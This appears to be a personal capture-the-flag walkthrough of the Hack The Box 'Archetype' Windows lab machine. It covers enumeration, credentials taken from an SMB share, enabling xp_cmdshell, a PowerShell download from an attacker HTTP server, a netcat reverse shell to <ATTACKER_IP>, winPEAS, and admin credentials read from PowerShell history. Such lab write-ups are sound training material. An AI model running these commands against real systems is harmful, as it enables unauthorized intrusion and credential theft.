
>[!tkdr] Archetype is a very easy Windows machine that features a misconfigured #MSSQL server, exposed #SMB shares and sensitive data exposure. An exposed SMB share can be accessed without authentication in which sensitive files can be found containing plaintext credentials. These credentials can be used to authenticate to MSSQL as the service account user through Impacket's mssqlclient tool. Command execution can then be achieved by enabling xp_cmdshell after which a reverse shell can be uploaded and triggered to get access to the host. Finally, WinPeas can be used to search for vulnerabilities which reveals a Powershell history file containing the password needed to achieve full privilege escalation.

---
1. Start with a `nmap` scan of all the TCP ports
```shell 
> nmap -p- -sT 10.129.95.187
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

> sudo nmap -F -sU 10.129.95.187
PORT     STATE         SERVICE
7/udp    open|filtered echo
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
4500/udp open|filtered nat-t-ike
5353/udp open|filtered zeroconf
```

2. I will enumerate in order of ports. Starting with `135`-`msrpc`, but i didn't get information to continue. 
3. So, instead i tried `139`-`netbios-ssn` 

```shell
❯ smbclient -N -L //10.129.95.187/

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	
	> The only non default share is "backups"
	
❯ smbclient //10.129.95.187/backups
# For the password i put "anonymous"
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		5056511 blocks of size 4096. 2516899 blocks available
smb: \> get prod.dtsConfig
```

- From the `prod.dtsConfig` we find a important line. From we got a password and user
	- `ARCHETYPE\sql_svc:M3g4c0rp123`
```shell
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=>
```

4. I then tried `crackmapexec` with the new credentials and but i dont think it worked.
```
crackmapexec smb 10.129.95.187 -u "ARCHETYPE\sql_svc" -p 'M3g4c0rp123'
SMB         10.129.95.187   445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 x64 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)
SMB         10.129.95.187   445    ARCHETYPE        [+] ARCHETYPE\sql_svc:M3g4c0rp123
```

5. I then try to login to `1433`-`ms-sql-s` which works. 
	- `ARCHETYPE\sql_svc:M3g4c0rp123`
	- I had to use a walkthrough: [Medium_Walkthrough](https://medium.com/@alt123/archetype-ctf-hackthebox-walkthrough-e0072ca9942f)
```shell
mssqlclient.py sql_svc@10.129.95.187 -windows-auth

SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell; RECONFIGURE; 
# Enable CMD access

SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
-
1
# We now know we have sysadmin!
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'net user';
<SNIP>
Administrator            DefaultAccount           Guest
sql_svc                  WDAGUtilityAccount
```

6. With confirmation of our admin privliges we will now put a reverse shell onto the server
	1. Download [Netcat for Windows 64](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)
	2. After downloading the `Netcat` we need to make the directory a HTTP server for the target server to access.
		1. `sudo python3 -m http.server -b <ATTACKER_IP> 80`
		- Note: I had to add `-b <ATTACKER_IP>` so it uses the VPN connection
	3. Now we set a listener (in another terminal)
		1. `sudo nc -lvnp 443`
	4. We then do a test (from `mssqlclient.py`) to see to directory powershell is in
		1. `xp_cmdshell "powershell -c pwd"`
			- A success should return a path like `C:\Windows\system32`
		2. `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<ATTACKER_IP>/nc64.exe -outfile nc64.exe"`
			- Download the file from our server
		3. `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <ATTACKER_IP> 443"`
			- Activate the reverse shell

```powershell
C:\Users\sql_svc\Downloads>dir
<SNIP>
08/04/2026  08:11 PM    <DIR>          .
08/04/2026  08:11 PM    <DIR>          ..
08/04/2026  08:24 PM            45,272 nc64.exe

<SNIP> We then navigate to \Desktop and find the file "user.txt"

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
[REDACTED_FLAG]
```
- User Flag -> `[REDACTED_FLAG]`

7. Now lets try to get privilege escalation, my starting tool is going to be `winPEAS`
	1. We first download the `x64` version [`winPEASx64.exe`](https://github.com/peass-ng/PEASS-ng/releases/download/20260803-00785084/winPEASx64.exe)
	2. Now we need the server to download it, we will utilize the http server we setup in step 6.2.
		-  `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<ATTACKER_IP>/winPEASx64.exe -outfile winPEASx64.exe"`
		- Note: It took a while to download for me, so double check the file size with `dir`. Once it looks correct then execute it from the reverse shell
	3. Execute with -> `winPEASx64.exe`
	4. `winPEAS` does a automated scan for vulnerabilites. In the case of a machine thats meant to be hacked, we get a LOT of options. About 61 exploited vulnerabilities and many many other ways listed.

```powershell
����������͹ Windows Version Vulnerabilities (T1082,T1068)
� Product candidates: Windows Server 2019 | Windows Server 2019 (Server Core installation)
� Definitions date: 20260801
� Installed hotfixes detected: 3
� Pre-filter matches: 410, filtered by installed/superseded KBs: 349
Matched 61 known exploited vulnerabilities for this running Windows version.
Matched products: Windows Server 2019 | Windows Server 2019 (Server Core installation)
    CVE-2018-8544 KB4467708 [Critical] Remote Code Execution
    CVE-2021-22947 KB5009557 [Critical] Remote Code Execution
    CVE-2025-47981 KB5062557 [Critical] Remote Code Execution
    CVE-2025-59287 KB5070883 [Critical] Remote Code Execution
    CVE-2018-8411 KB4464330 [Important] Elevation of Privilege
    CVE-2018-8423 KB4464330 [Important] Remote Code Execution
    CVE-2018-8453 KB4464330 [Important] Elevation of Privilege
    CVE-2018-8550 KB4467708 [Important] Elevation of Privilege
    CVE-2018-8584 KB4467708 [Important] Elevation of Privilege
    CVE-2019-0543 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0552 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0555 KB4487044 [Important] Elevation of Privilege
    CVE-2019-0570 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0571 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0572 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0573 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0574 KB4480116 [Important] Elevation of Privilege
    CVE-2019-0730 KB4493509 [Important] Elevation of Privilege
    CVE-2019-0731 KB4493509 [Important] Elevation of Privilege
    CVE-2019-0732 KB4493509 [Important] Security Feature Bypass
� Showing 20/61 results.
```

- I then threw these in to Claude and asked which would be best for my situation, after reading a few i found `CVE-2019-0731`.
>[!warning] I jumped to the CVEs when i shouldve looked at the low hanging fruit
>`C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

- Within the history of this file we can find 
```powershell
C:\Users\sql_svc\Downloads>type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

- We found credentials!
	- `administrator:MEGACORP_4dm1n!!`

8. Now i want to login with the admin credentials
	1. `mssqlclient.py` -> Doesn't work
	2. `xfreerdp3` -> Doesn't work
	3. `psexec.py administrator@10.129.95.187` -> Works!

```powershell
# I was lost so i ran
C:\Windows\system32> DIR C:\Users
<SNIP>
01/19/2020  04:10 PM    <DIR>          .
01/19/2020  04:10 PM    <DIR>          ..
01/19/2020  11:39 PM    <DIR>          Administrator
01/19/2020  11:39 PM    <DIR>          Public
01/20/2020  06:01 AM    <DIR>          sql_svc

# Lets go to Administrator\Desktop since root flag should be there
cd C:\Users\Administrator\Desktop

# Lets read out the contents
C:\Users\Administrator\Desktop> dir
<SNIP>
07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt

# Nice! lets get the flag!
C:\Users\Administrator\Desktop> type root.txt
[REDACTED_FLAG]
```

- Root Flag -> `[REDACTED_FLAG]`